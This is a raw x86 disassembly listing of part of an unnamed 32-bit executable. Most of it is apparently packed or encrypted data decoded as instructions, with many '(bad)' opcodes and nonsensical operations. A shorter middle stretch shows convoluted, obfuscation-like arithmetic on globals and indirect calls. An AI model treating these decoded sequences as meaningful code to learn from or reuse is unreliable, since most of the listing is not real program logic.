  40333e:	adc    DWORD PTR [ebx],esp
  403340:	leave  
  403341:	fstp   TBYTE PTR [ebx+0x7b037649]
  403347:	adc    ch,BYTE PTR [ebx]
  403349:	aam    0xb
  40334b:	call   edx
  40334d:	push   es
  40334e:	jne    0x403355
  403350:	mov    dl,0xaf
  403352:	and    dh,dh
  403354:	cli    
  403355:	add    dh,BYTE PTR [edi-0x2b]
  403358:	xor    esi,DWORD PTR [edx+ecx*4+0xbb26b91]
  40335f:	add    ch,BYTE PTR [edi-0x5f205f4b]
  403365:	push   ss
  403366:	mov    DWORD PTR [eax],esi
  403368:	sbb    eax,DWORD PTR es:[edx-0x5b]
  40336c:	push   edi
  40336d:	inc    edi
  40336e:	and    edx,DWORD PTR [esi-0x25e156d4]
  403374:	leave  
  403375:	jg     0x4033cb
  403377:	scas   eax,DWORD PTR es:[edi]
  403378:	scas   eax,DWORD PTR es:[edi]
  403379:	jl     0x403369
  40337b:	retf   
  40337c:	(bad)  
  40337d:	mov    ebp,0xf92898e5
  403382:	dec    esi
  403383:	mov    ebx,0x845e1298
  403388:	mov    BYTE PTR [ebp+0x2c],0x94
  40338c:	or     eax,0x149dddc9
  403391:	cwde   
  403392:	call   0xb28c9164
  403397:	lds    ecx,FWORD PTR [edx+0x32]
  40339a:	inc    ecx
  40339b:	clc    
  40339c:	or     ebp,eax
  40339e:	pop    eax
  40339f:	mov    cl,bl
  4033a1:	loope  0x403391
  4033a3:	fcom   QWORD PTR [esi-0x25]
  4033a6:	dec    ebp
  4033a7:	dec    edi
  4033a8:	xchg   ebx,ecx
  4033aa:	test   esp,esp
  4033ac:	xor    dh,BYTE PTR [edi+0x569063ee]
  4033b2:	or     al,0xc7
  4033b4:	jp     0x40340f
  4033b6:	jnp    0x403389
  4033b8:	add    bl,dl
  4033ba:	lahf   
  4033bb:	add    BYTE PTR [edx+0x4f135c86],bl
  4033c1:	and    eax,0x188070c2
  4033c6:	xchg   edx,eax
  4033c7:	push   0x2f2f2b24
  4033cc:	xor    bl,dh
  4033ce:	out    0x68,al
  4033d0:	outs   dx,BYTE PTR ds:[esi]
  4033d1:	ret    0x7088
  4033d4:	lea    edi,[ecx]
  4033d6:	nop
  4033d7:	adc    eax,0xf0a3e3ea
  4033dc:	mov    ?,WORD PTR [edi]
  4033de:	js     0x403445
  4033e0:	not    BYTE PTR [eax+0x25]
  4033e3:	and    al,0xef
  4033e5:	adc    eax,DWORD PTR [ebx+0x28a62161]
  4033eb:	cmc    
  4033ec:	lods   al,BYTE PTR ds:[esi]
  4033ed:	cdq    
  4033ee:	xchg   edx,eax
  4033ef:	sub    BYTE PTR [edi-0x51],bl
  4033f2:	rol    BYTE PTR [ecx-0x42],1
  4033f5:	xchg   BYTE PTR [ecx-0x30],dh
  4033f8:	(bad)  [edi+ebx*4+0x7a14f0d6]
  4033ff:	aam    0xf7
  403401:	sar    DWORD PTR [edx-0x54],0xed
  403405:	jp     0x403430
  403407:	and    eax,DWORD PTR [esi+0x2c]
  40340a:	mov    dl,0x90
  40340c:	es enter 0x4517,0x4a
  403411:	push   ecx
  403412:	mov    cl,0xe0
  403414:	ja     0x403415
  403416:	mov    esp,0xee81b62f
  40341b:	clc    
  40341c:	cwde   
  40341d:	aaa    
  40341e:	add    DWORD PTR [eax+0x1c],eax
  403421:	xlat   BYTE PTR ds:[ebx]
  403422:	cmp    al,0x7e
  403424:	mov    ecx,0xa0dce864
  403429:	out    0x49,al
  40342b:	cmp    al,cl
  40342d:	ins    DWORD PTR es:[edi],dx
  40342e:	mov    ?,WORD PTR [esi+0x3d]
  403431:	mov    ds:0xe01a9f56,al
  403436:	pop    esp
  403437:	sub    al,0x4
  403439:	mov    al,ds:0xa2eca43b
  40343e:	sbb    BYTE PTR [esi+eiz*4-0x7c],dh
  403442:	ins    BYTE PTR es:[edi],dx
  403443:	jle    0x403414
  403445:	fwait
  403446:	aad    0x49
  403448:	push   cs
  403449:	mov    edi,DWORD PTR [ebp-0x4]
  40344c:	mov    esp,0x94fda661
  403451:	loopne 0x403482
  403453:	test   ah,dh
  403455:	scas   al,BYTE PTR es:[edi]
  403456:	pop    ebx
  403457:	retf   0x18dc
  40345a:	jb     0x40340a
  40345c:	jg     0x403451
  40345e:	(bad)  
  40345f:	mov    ds:0xec31794a,eax
  403464:	xlat   BYTE PTR es:[ebx]
  403466:	mov    fs,WORD PTR [esi+0x70]
  403469:	jne    0x4034e1
  40346b:	sub    ah,0xb6
  40346e:	inc    ecx
  40346f:	popf   
  403470:	out    0xf,al
  403472:	jp     0x40347a
  403474:	jg     0x40345f
  403476:	or     DWORD PTR [esi+0x53d6ca5a],edi
  40347c:	add    BYTE PTR [edx-0x6],ah
  40347f:	jbe    0x403487
  403481:	js     0x4034fb
  403483:	jmp    0x1b7173f6
  403488:	sbb    DWORD PTR ds:0x2fcafcf3,ebx
  40348e:	mov    eax,ds:0x2b266c84
  403493:	sbb    al,0x13
  403495:	ror    BYTE PTR [edx],1
  403497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403498:	add    BYTE PTR [eax],dl
  40349a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40349b:	or     al,0x55
  40349d:	fwait
  40349e:	imul   esp,ecx,0xffffffd4
  4034a1:	mov    edi,0xe5c97534
  4034a6:	dec    ebp
  4034a7:	fdiv   QWORD PTR [edx]
  4034a9:	dec    ecx
  4034aa:	in     al,dx
  4034ab:	(bad)  
  4034ac:	sub    ebx,edx
  4034ae:	sub    bl,BYTE PTR [edx-0x57]
  4034b1:	or     eax,0x8e75858b
  4034b6:	add    BYTE PTR ds:0x22fd7170,bl
  4034bc:	in     eax,dx
  4034bd:	into   
  4034be:	fsub   st,st(4)
  4034c0:	inc    esp
  4034c1:	in     eax,dx
  4034c2:	inc    eax
  4034c3:	sbb    esi,DWORD PTR [eax-0x454ce423]
  4034c9:	cli    
  4034ca:	imul   ebx,DWORD PTR [edx],0x1d
  4034cd:	xchg   ebp,eax
  4034ce:	aad    0xfc
  4034d0:	mov    DWORD PTR [eax],ebx
  4034d2:	arpl   bx,dx
  4034d4:	stos   BYTE PTR es:[edi],al
  4034d5:	fsub   st,st(5)
  4034d7:	retf   
  4034d8:	outs   dx,DWORD PTR ds:[esi]
  4034d9:	(bad)  
  4034da:	pop    ebx
  4034db:	or     dl,0xa3
  4034de:	out    dx,eax
  4034df:	and    DWORD PTR [edx],0xdf60e99e
  4034e5:	loop   0x40354d
  4034e7:	ret    
  4034e8:	dec    ebp
  4034e9:	(bad)  
  4034ea:	(bad)  
  4034eb:	sti    
  4034ec:	stc    
  4034ed:	mov    ecx,DWORD PTR [ebp-0x14]
  4034f0:	cmp    eax,DWORD PTR [ecx]
  4034f2:	mov    DWORD PTR ds:0x428143,0x673a
  4034fc:	jne    0x403a37
  403502:	jmp    0x4038e0
  403507:	sbb    ebp,esi
  403509:	fld    TBYTE PTR [ecx]
  40350b:	sbb    esp,DWORD PTR ds:0x5dedeb1b
  403511:	or     BYTE PTR [edx+0x5e],ch
  403514:	stos   DWORD PTR es:[edi],eax
  403515:	fstp   TBYTE PTR [esi-0x3d]
  403518:	in     eax,0x18
  40351a:	sbb    BYTE PTR [esi+0x66181812],bl
  403520:	xchg   edi,eax
  403521:	and    eax,0x8d367ff9
  403526:	(bad)  
  403527:	cdq    
  403528:	out    0xa3,eax
  40352a:	stos   DWORD PTR es:[edi],eax
  40352b:	cmp    al,0xb5
  40352d:	jg     0x4034dd
  40352f:	ss mov edi,0xac8da67a
  403535:	cdq    
  403536:	stos   DWORD PTR es:[edi],eax
  403537:	imul   eax,DWORD PTR [ecx+0x50],0xfffffff0
  40353b:	cmp    esp,DWORD PTR [ebx+0x3504a7e7]
  403541:	retf   
  403542:	mov    ch,0xca
  403544:	fadd   QWORD PTR [edx]
  403546:	sbb    BYTE PTR [ebp+ebx*4+0x37c0d441],ah
  40354d:	xor    al,0xc2
  40354f:	in     eax,dx
  403550:	out    0x1a,eax
  403552:	dec    edx
  403553:	cs sub ebx,esi
  403556:	ja     0x403550
  403558:	mov    dh,0x9f
  40355a:	rcr    BYTE PTR [ebx-0x31],0xd4
  40355e:	mov    esp,DWORD PTR [edx]
  403560:	mov    eax,0x10c90f26
  403565:	xchg   ecx,ecx
  403567:	pop    es
  403568:	sub    ah,BYTE PTR [edi+0x623b4532]
  40356e:	scas   al,BYTE PTR es:[edi]
  40356f:	pop    ebx
  403570:	inc    esp
  403571:	adc    BYTE PTR [ebx+0x78],dl
  403574:	xor    eax,DWORD PTR [edx-0x6b]
  403577:	mov    eax,0xfa284a78
  40357c:	js     0x4035d4
  40357e:	daa    
  40357f:	sub    eax,0x48ab1abc
  403584:	dec    edx
  403585:	lods   al,BYTE PTR ds:[esi]
  403586:	push   eax
  403587:	in     al,0x5e
  403589:	stos   BYTE PTR es:[edi],al
  40358a:	popf   
  40358b:	cmp    DWORD PTR [eax+0x38],ebp
  40358e:	push   esi
  40358f:	mov    WORD PTR [ecx],cs
  403591:	pop    es
  403592:	arpl   WORD PTR [edi],bx
  403594:	and    eax,0x3eac6fa
  403599:	outs   dx,DWORD PTR ds:[esi]
  40359a:	push   edi
  40359b:	add    DWORD PTR [esi-0x485a854d],ebp
  4035a1:	or     eax,DWORD PTR [esi-0x3d]
  4035a4:	xlat   BYTE PTR ds:[ebx]
  4035a5:	out    0x9f,al
  4035a7:	mov    WORD PTR [ebx+0x214664b1],?
  4035ad:	mov    edi,0x14511ea
  4035b2:	nop
  4035b3:	jb     0x403570
  4035b5:	sub    eax,0x16825cb3
  4035ba:	pop    es
  4035bb:	dec    esp
  4035bc:	xor    DWORD PTR [ebx+ebp*1],ebx
  4035bf:	and    al,0xcf
  4035c1:	jb     0x40354b
  4035c3:	pusha  
  4035c4:	pop    esi
  4035c5:	adc    esp,DWORD PTR [eax-0x8]
  4035c8:	xor    edi,ebp
  4035ca:	xchg   ecx,edx
  4035cc:	lds    eax,FWORD PTR [eax-0x7cbdb990]
  4035d2:	or     al,0xf9
  4035d4:	dec    ebx
  4035d5:	test   al,0x24
  4035d7:	iret   
  4035d8:	ror    BYTE PTR [ebp+ebx*1+0x10],1
  4035dc:	scas   eax,DWORD PTR es:[edi]
  4035dd:	rcl    BYTE PTR [eax],cl
  4035df:	mov    ah,BYTE PTR [ebp+0x41]
  4035e2:	sub    esp,esp
  4035e4:	fldenv ds:0x7c21c69d
  4035ea:	inc    ebx
  4035eb:	dec    edx
  4035ec:	pop    ebx
  4035ed:	add    al,0xc8
  4035ef:	sbb    eax,0xdc99157d
  4035f4:	popa   
  4035f5:	mov    ebx,0xf315a0d7
  4035fa:	ret    
  4035fb:	int3   
  4035fc:	mov    esi,0x82f5e9d5
  403601:	stos   DWORD PTR es:[edi],eax
  403602:	xchg   bh,bh
  403604:	aaa    
  403605:	push   eax
  403606:	lea    edi,[ecx]
  403608:	out    dx,al
  403609:	fisub  WORD PTR [ebx+0x2f]
  40360c:	push   esi
  40360d:	mov    cl,0x86
  40360f:	jmp    0x2b58:0x9827fb88
  403616:	inc    ebx
  403617:	shl    bl,cl
  403619:	das    
  40361a:	xchg   BYTE PTR [eax-0x35788d7a],cl
  403620:	xor    esi,esi
  403622:	pop    eax
  403623:	retf   
  403624:	add    bh,bl
  403626:	(bad)  
  403628:	(bad)  
  403629:	mov    WORD PTR [ebx-0x4f],fs
  40362c:	xor    al,BYTE PTR [esp+ebx*4]
  40362f:	sub    eax,0x153855c6
  403634:	add    al,0xa5
  403636:	callw  0xbbeb
  40363a:	xlat   BYTE PTR ds:[ebx]
  40363b:	jb     0x40361f
  40363d:	aad    0x7
  40363f:	sub    eax,0x1fd64b37
  403644:	cmp    cl,ah
  403646:	int    0xbd
  403648:	jo     0x4035f4
  40364a:	das    
  40364b:	jae    0x403633
  40364d:	xchg   esi,eax
  40364e:	ret    0xfa07
  403651:	mov    ch,0x96
  403653:	in     eax,0x79
  403655:	test   al,0xed
  403657:	inc    eax
  403658:	shr    BYTE PTR [ebx+0x55],1
  40365b:	add    eax,0x9418672
  403660:	mov    BYTE PTR [ecx],bh
  403662:	(bad)  
  403663:	fisubr DWORD PTR [esi+0x36e15d87]
  403669:	add    al,0x16
  40366b:	js     0x40365e
  40366d:	mov    esp,DWORD PTR [ebx+edi*4-0x306634f0]
  403674:	fnstsw WORD PTR [ecx+ebp*8]
  403677:	dec    ebx
  403678:	ret    
  403679:	je     0x4036ef
  40367b:	cmp    BYTE PTR [eax+0x8],dh
  40367e:	pop    DWORD PTR [eax-0x13]
  403681:	inc    eax
  403682:	mov    eax,ds:0x9171d10f
  403687:	push   es
  403688:	mov    ah,0x47
  40368a:	in     al,dx
  40368b:	inc    edx
  40368c:	push   edx
  40368d:	sbb    edx,DWORD PTR [ebp+0x5dac38e4]
  403693:	sub    ebp,DWORD PTR [esi]
  403695:	data16 sbb dh,dh
  403698:	cli    
  403699:	shl    DWORD PTR [ecx-0x2ebd4e8b],cl
  40369f:	loopne 0x403701
  4036a1:	push   ebp
  4036a2:	jns    0x4036d8
  4036a4:	mov    bl,0x12
  4036a6:	add    al,0xaa
  4036a8:	xchg   ebx,eax
  4036a9:	outs   dx,DWORD PTR ds:[esi]
  4036aa:	xchg   ebx,eax
  4036ab:	rcl    DWORD PTR [ecx],cl
  4036ad:	or     BYTE PTR [edx+0x4be15858],ah
  4036b3:	push   edx
  4036b4:	pop    es
  4036b5:	daa    
  4036b6:	push   es
  4036b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036b8:	push   ss
  4036b9:	int    0xe
  4036bb:	push   0xffffffd8
  4036bd:	jae    0x4036d2
  4036bf:	ret    
  4036c0:	(bad)  
  4036c1:	shl    DWORD PTR [eax],cl
  4036c3:	mov    esp,0x6c86d575
  4036c8:	icebp  
  4036c9:	inc    ecx
  4036ca:	jno    0x403747
  4036cc:	into   
  4036cd:	enter  0xd38b,0xe9
  4036d1:	out    0x66,eax
  4036d3:	in     al,0xda
  4036d5:	enter  0xc4d1,0x6
  4036d9:	fsub   QWORD PTR [esi-0x4c1afa]
  4036df:	pop    edx
  4036e0:	mov    esp,cs
  4036e2:	and    bl,BYTE PTR [ecx-0x5e]
  4036e5:	(bad)  
  4036e6:	xchg   esp,eax
  4036e7:	aas    
  4036e8:	adc    ah,BYTE PTR [edx+esi*2-0x43e18f40]
  4036ef:	iret   
  4036f0:	inc    esp
  4036f1:	mov    gs,WORD PTR [eax]
  4036f3:	jno    0x4036b0
  4036f5:	pushf  
  4036f6:	jb     0x403710
  4036f8:	sbb    eax,0x3aa57e67
  4036fd:	stc    
  4036fe:	xlat   BYTE PTR ds:[ebx]
  4036ff:	aas    
  403700:	jb     0x403758
  403702:	pop    eax
  403703:	jnp    0x403688
  403705:	sar    DWORD PTR [eax+0x2dd3163c],1
  40370b:	mov    edi,0x7a9ac3fc
  403710:	in     eax,0x48
  403712:	or     eax,0x19976f5
  403717:	arpl   bp,ax
  403719:	sub    eax,DWORD PTR [ebx-0x194dfeea]
  40371f:	jno    0x403767
  403721:	sti    
  403722:	fiadd  WORD PTR [ecx+0x3c93f637]
  403728:	test   BYTE PTR [edx],0x16
  40372b:	xchg   esp,eax
  40372c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40372d:	mov    al,0xd8
  40372f:	jle    0x4036dc
  403731:	ds mov dh,0xd
  403734:	push   ebx
  403735:	push   eax
  403736:	out    dx,eax
  403737:	mov    esi,0xa02351d3
  40373c:	pop    edx
  40373d:	arpl   ax,bp
  40373f:	shl    BYTE PTR [ebp+0x2d],1
  403742:	out    dx,al
  403743:	jo     0x403746
  403745:	rol    BYTE PTR [ebx],cl
  403747:	repz mov cl,0x81
  40374a:	fwait
  40374b:	add    cl,dh
  40374d:	test   DWORD PTR [ecx],edi
  40374f:	rcr    BYTE PTR [edi],1
  403751:	mov    ebp,ds
  403753:	cdq    
  403754:	or     al,0x1a
  403756:	cwde   
  403757:	mov    ds:0xff756eb0,eax
  40375c:	dec    esi
  40375d:	or     ch,BYTE PTR ds:0xdf946f6b
  403763:	pop    esi
  403764:	mov    al,0xe
  403766:	nop
  403767:	in     al,0xf
  403769:	pop    ebp
  40376a:	ficomp WORD PTR ss:[edi+ecx*4]
  40376e:	push   eax
  40376f:	push   ss
  403770:	mov    bh,0x2
  403772:	xchg   ecx,eax
  403773:	pop    ds
  403774:	mov    WORD PTR [eax],cs
  403776:	xor    edi,DWORD PTR ds:0xa062301c
  40377c:	inc    eax
  40377d:	jo     0x4037ea
  40377f:	popf   
  403780:	xor    eax,eax
  403782:	es popa 
  403784:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403785:	in     eax,dx
  403786:	mov    eax,ds:0x1500b7ba
  40378b:	mov    dh,0x3
  40378d:	add    ebx,esi
  40378f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403790:	push   ebp
  403791:	imul   ebx,DWORD PTR [edi-0x15],0x1e
  403795:	push   ebx
  403796:	cmp    dh,BYTE PTR [ecx-0x6b9aaff9]
  40379c:	cli    
  40379d:	jmp    0xd2d1:0x75dcef34
  4037a4:	push   esi
  4037a5:	std    
  4037a6:	cmp    eax,0x8fb9f825
  4037ab:	jecxz  0x403779
  4037ad:	adc    bl,BYTE PTR [ebp+0x2bbb5a]
  4037b3:	sbb    al,0xda
  4037b5:	and    al,0x12
  4037b7:	popf   
  4037b8:	repz sahf 
  4037ba:	xchg   edi,eax
  4037bb:	test   al,0xdb
  4037bd:	jp     0x4037b2
  4037bf:	outs   dx,DWORD PTR ds:[esi]
  4037c0:	jle    0x403742
  4037c2:	sub    eax,0x106c1d64
  4037c7:	mov    dl,cl
  4037c9:	add    eax,0x7b4ef78e
  4037ce:	push   ds
  4037cf:	leave  
  4037d0:	into   
  4037d1:	push   esp
  4037d2:	or     bh,BYTE PTR [edx-0x2e]
  4037d5:	int    0xc3
  4037d7:	inc    esi
  4037d8:	add    esi,ebx
  4037da:	or     DWORD PTR [eax+0x4c400864],ebx
  4037e0:	cmp    dl,BYTE PTR [esi-0x1c]
  4037e3:	sbb    ebx,DWORD PTR [eax-0x26727c9d]
  4037e9:	cmp    BYTE PTR [ebx-0x52],bl
  4037ec:	rol    DWORD PTR [ebx],0xe3
  4037ef:	push   edx
  4037f0:	add    eax,0x21797879
  4037f5:	mov    BYTE PTR ds:0x5c367e8e,al
  4037fb:	sub    eax,0x582a5e8c
  403800:	(bad)  
  403801:	push   esp
  403802:	add    al,0x6f
  403804:	scas   eax,DWORD PTR es:[edi]
  403805:	aas    
  403806:	neg    ebx
  403808:	clc    
  403809:	out    dx,eax
  40380a:	xchg   esi,eax
  40380b:	sbb    edx,DWORD PTR [ebx]
  40380d:	jns    0x4037a4
  40380f:	aaa    
  403810:	mov    edi,0x14ecef05
  403815:	xchg   esp,eax
  403816:	(bad)  
  403817:	repz mov eax,ds:0xb335228
  40381d:	stc    
  40381e:	pop    ebp
  40381f:	int    0xcd
  403821:	or     BYTE PTR [ecx+ebp*1+0x6429d4a8],dl
  403828:	addr16 cwde 
  40382a:	cmp    al,0x9c
  40382c:	sub    al,0xa5
  40382e:	mov    ds:0x5c1c5e34,eax
  403833:	ins    DWORD PTR es:[edi],dx
  403834:	mov    ebx,0x78999e08
  403839:	icebp  
  40383a:	inc    ebp
  40383b:	lea    esp,[edx]
  40383d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40383e:	out    dx,al
  40383f:	xor    BYTE PTR [edx+0x60004ace],cl
  403845:	repnz popf 
  403847:	jns    0x40380d
  403849:	adc    esi,esp
  40384b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40384c:	(bad)  
  40384d:	repnz push cs
  40384f:	xor    DWORD PTR [edi+0x2f0d4db0],ebp
  403855:	test   al,0xa2
  403857:	push   cs
  403858:	idiv   esi
  40385a:	inc    ecx
  40385b:	ins    DWORD PTR es:[edi],dx
  40385c:	cwde   
  40385d:	and    DWORD PTR [ecx-0x760c6c9d],esi
  403863:	or     al,0xd0
  403865:	ret    0x9c47
  403868:	push   ds
  403869:	push   cs
  40386a:	imul   ecx,DWORD PTR [eax-0x4145b069],0x9e512d4f
  403874:	aaa    
  403875:	inc    ebp
  403876:	add    DWORD PTR [esi+0x59],edx
  403879:	xor    bh,dl
  40387b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40387c:	adc    edi,edi
  40387e:	add    eax,0xd67ef6eb
  403883:	fmul   QWORD PTR [esi-0x4571df34]
  403889:	cmp    BYTE PTR [ecx],0x2b
  40388c:	repz popa 
  40388e:	rol    BYTE PTR [edi-0x79e2bddf],0x8e
  403895:	cmp    eax,0xe0f298
  40389a:	mov    edi,0xd054f004
  40389f:	ja     0x4038e8
  4038a1:	enter  0x1b16,0x5f
  4038a5:	cmc    
  4038a6:	pushf  
  4038a7:	rol    BYTE PTR [ecx+0x36],cl
  4038aa:	push   esi
  4038ab:	je     0x4038ae
  4038ad:	mov    al,0xc8
  4038af:	fist   WORD PTR [ebp+0x36402b87]
  4038b5:	sbb    esp,eax
  4038b7:	popa   
  4038b8:	cmc    
  4038b9:	cdq    
  4038ba:	dec    esp
  4038bb:	(bad)
  4038be:	push   0x30
  4038c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038c1:	sub    al,0x7a
  4038c3:	adc    esi,DWORD PTR [ebp+edx*4+0x79]
  4038c7:	pop    ecx
  4038c8:	xor    dl,BYTE PTR [ebp-0x14]
  4038cb:	adc    eax,0x737dacd5
  4038d0:	retf   0xcbd3
  4038d3:	push   0x1667962f
  4038d8:	fdivr  st(5),st
  4038da:	xchg   ebx,eax
  4038db:	pop    ss
  4038dc:	shl    DWORD PTR [edx],1
  4038de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038df:	sbb    cl,BYTE PTR [ebx+0x3d83f445]
  4038e5:	inc    ebx
  4038e6:	add    BYTE PTR [edx+0x0],0x0
  4038ea:	not    DWORD PTR ds:0x42813b
  4038f0:	mov    ecx,DWORD PTR ds:0x428267
  4038f6:	jmp    0x40393f
  4038fb:	not    ecx
  4038fd:	cmp    DWORD PTR ds:0x428243,0x0
  403904:	jne    0x403929
  40390a:	push   DWORD PTR [ebp-0x18]
  40390d:	call   DWORD PTR ds:0x428eb8
  403913:	xor    edx,DWORD PTR ds:0x42822f
  403919:	neg    DWORD PTR ds:0x428243
  40391f:	xor    DWORD PTR ds:0x428137,0x12a5
  403929:	and    DWORD PTR ds:0x428387,0xf8b
  403933:	sbb    edx,DWORD PTR ds:0x42826b
  403939:	or     ecx,DWORD PTR ds:0x42821f
  40393f:	mov    ecx,DWORD PTR [ebp+0x20]
  403942:	cmp    DWORD PTR ds:0x428143,0x0
  403949:	mov    DWORD PTR ds:0x428387,0x6ff3
  403953:	mov    edx,0x7151
  403958:	jmp    0x4039b3
  40395d:	mov    edx,0x2845
  403962:	cmp    DWORD PTR ds:0x428143,0x0
  403969:	jbe    0x403993
  40396f:	push   0x3359
  403974:	push   0x2d4b
  403979:	call   DWORD PTR ds:0x428d8c
  40397f:	adc    DWORD PTR ds:0x428277,0x42815f
  403989:	sbb    DWORD PTR ds:0x428263,0x4dea
  403993:	mov    edx,DWORD PTR ds:0x428363
  403999:	or     DWORD PTR ds:0x42823f,edx
  40399f:	xor    edx,edx
  4039a1:	add    edx,DWORD PTR ds:0x428267
  4039a7:	adc    edx,DWORD PTR ds:0x42824b
  4039ad:	mov    DWORD PTR ds:0x428267,edx
  4039b3:	xor    DWORD PTR [eax],ecx
  4039b5:	or     DWORD PTR ds:0x42821f,0x56f
  4039bf:	mov    eax,DWORD PTR [ebp-0xc]
  4039c2:	mov    ecx,DWORD PTR [ebp+0x18]
  4039c5:	and    DWORD PTR ds:0x428287,edi
  4039cb:	mov    edx,DWORD PTR [ebp+0x1c]
  4039ce:	or     DWORD PTR ds:0x42827b,0x428387
  4039d8:	shrd   ecx,edx,0x2
  4039dc:	mov    DWORD PTR [ebp-0x14],ecx
  4039df:	adc    ecx,DWORD PTR ds:0x42815b
  4039e5:	mov    ecx,DWORD PTR [ebp+0x18]
  4039e8:	xor    DWORD PTR [ebp-0x14],edi
  4039eb:	adc    DWORD PTR ds:0x428137,0x4282ff
  4039f5:	shr    edx,0x2
  4039f8:	or     DWORD PTR ds:0x428143,0x3344
  403a02:	mov    edx,DWORD PTR [ebp+0x1c]
  403a05:	sbb    DWORD PTR ds:0x42813b,0x4282d3
  403a0f:	xor    edx,edx
  403a11:	or     DWORD PTR ds:0x42824f,0xcfb
  403a1b:	or     edx,DWORD PTR [ebp-0x14]
  403a1e:	sub    DWORD PTR ds:0x428267,0x10bb
  403a28:	shl    ecx,0x1e
  403a2b:	sub    DWORD PTR ds:0x428137,0x1733
  403a35:	sub    DWORD PTR [eax],edx
  403a37:	cmp    DWORD PTR ds:0x428263,0x0
  403a3e:	mov    DWORD PTR ds:0x4282ef,0x3c7c
  403a48:	mov    ecx,0x6a18
  403a4d:	jmp    0x403aac
  403a52:	mov    eax,ds:0x428387
  403a57:	cmp    DWORD PTR ds:0x428263,0x0
  403a5e:	jne    0x403a98
  403a64:	push   0x773d
  403a69:	call   DWORD PTR ds:0x428d68
  403a6f:	mov    edx,DWORD PTR ds:0x42831f
  403a75:	xor    ecx,ecx
  403a77:	xor    ecx,DWORD PTR ds:0x4283b3
  403a7d:	sub    edx,ecx
  403a7f:	or     edx,DWORD PTR [edx+ecx*1]
  403a82:	sbb    ecx,0x3181
  403a88:	xor    DWORD PTR ds:0x428163,0x1adf
  403a92:	xor    edx,0x1011
  403a98:	sbb    DWORD PTR ds:0x428157,0x2089
  403aa2:	or     DWORD PTR ds:0x42813b,0x113b
  403aac:	mov    eax,ds:0x4223b0
  403ab1:	cmp    DWORD PTR ds:0x428163,0x0
  403ab8:	mov    edx,0x6e0d
  403abd:	mov    edx,DWORD PTR ds:0x42822f
  403ac3:	mov    DWORD PTR ds:0x428213,0x403
  403acd:	jmp    0x403b18
  403ad2:	mov    DWORD PTR ds:0x428303,0x6b1a
  403adc:	mov    DWORD PTR ds:0x428163,0x1226
  403ae6:	cmp    DWORD PTR ds:0x428163,0x0
  403aed:	jle    0x403b06
  403af3:	push   0x428103
  403af8:	call   DWORD PTR ds:0x428d90
  403afe:	and    ecx,edx
  403b00:	adc    edx,0x75b0
  403b06:	or     DWORD PTR ds:0x42822b,ecx
  403b0c:	add    edx,0x4c60
  403b12:	add    DWORD PTR ds:0x42826f,ecx
  403b18:	mov    ecx,DWORD PTR [ebp-0xc]
  403b1b:	xor    DWORD PTR ds:0x42835b,0x2c42
  403b25:	mov    eax,DWORD PTR [eax]
  403b27:	add    DWORD PTR ds:0x42814b,edx
  403b2d:	jmp    0x403f0b
  403b32:	and    BYTE PTR [edi-0x43],dh
  403b35:	fdivr  QWORD PTR [edx+0x5e33201a]
  403b3b:	xchg   bh,dl
  403b3d:	mov    esp,0xbcd93a19
  403b42:	dec    eax
  403b43:	fistp  WORD PTR [eax]
  403b45:	sbb    BYTE PTR [esi-0x3fe7e7ee],bl
  403b4b:	(bad)  [edi]
  403b4d:	loope  0x403bbd
  403b4f:	push   edi
  403b50:	jge    0x403bcf
  403b52:	popa   
  403b53:	(bad)
  403b58:	fdivr  QWORD PTR [ebx]
  403b5a:	or     al,0xf9
  403b5c:	adc    al,0xc0
  403b5e:	out    0xf1,al
  403b60:	pop    esp
  403b61:	sbb    DWORD PTR [eax],edx
  403b63:	enter  0xfcbe,0xd6
  403b67:	sub    cl,BYTE PTR [esi+0x29261c7f]
  403b6d:	push   ds
  403b6e:	xchg   ecx,eax
  403b6f:	add    ah,dl
  403b71:	push   ds
  403b72:	out    dx,al
  403b73:	pusha  
  403b74:	mov    ebx,0x62730b8f
  403b79:	mov    BYTE PTR [ebx],dl
  403b7b:	pop    edi
  403b7c:	mov    cl,0x98
  403b7e:	scas   al,BYTE PTR es:[edi]
  403b7f:	jne    0x403b05
  403b81:	inc    esp
  403b82:	outs   dx,BYTE PTR ds:[esi]
  403b83:	add    al,0x1b
  403b85:	and    BYTE PTR [esp+edx*1-0xa],dh
  403b89:	sbb    BYTE PTR [ecx+0x1247946b],dh
  403b8f:	jmp    0xd693c7d2
  403b94:	lods   eax,DWORD PTR ds:[esi]
  403b95:	fnstenv [ebx+0x26]
  403b98:	push   es
  403b99:	repnz and eax,0xd1ac2193
  403b9f:	mov    edi,0x4debce9e
  403ba4:	add    eax,0x785e54e3
  403ba9:	stos   BYTE PTR es:[edi],al
  403baa:	in     al,0x2d
  403bac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bad:	outs   dx,DWORD PTR ds:[esi]
  403bae:	pop    es
  403baf:	jl     0x403c1e
  403bb1:	cs jae 0x403bf8
  403bb4:	cmp    edx,ecx
  403bb6:	pop    ecx
  403bb7:	cli    
  403bb8:	push   es
  403bb9:	call   0x811d16d7
  403bbe:	mov    edi,0x4676b3e5
  403bc3:	and    BYTE PTR [edi+0x667c0aa9],bl
  403bc9:	jmp    0xe47d:0x9c94ca1e
  403bd0:	fidiv  DWORD PTR [ebp+0x3bd5bcf]
  403bd6:	dec    ebp
  403bd7:	neg    DWORD PTR ds:0x4f6d0765
  403bdd:	inc    esp
  403bde:	retf   0x7f1b
  403be1:	mov    eax,ds:0x470ea724
  403be6:	out    0xdc,al
  403be8:	in     eax,dx
  403be9:	jae    0x403b90
  403beb:	pop    ds
  403bec:	and    DWORD PTR [ebx+0x57348294],esp
  403bf2:	jno    0x403bc3
  403bf4:	inc    edx
  403bf5:	repnz pusha 
  403bf7:	dec    edx
  403bf8:	enter  0xd26,0x5c
  403bfc:	mul    BYTE PTR [edi+0x2d38c01d]
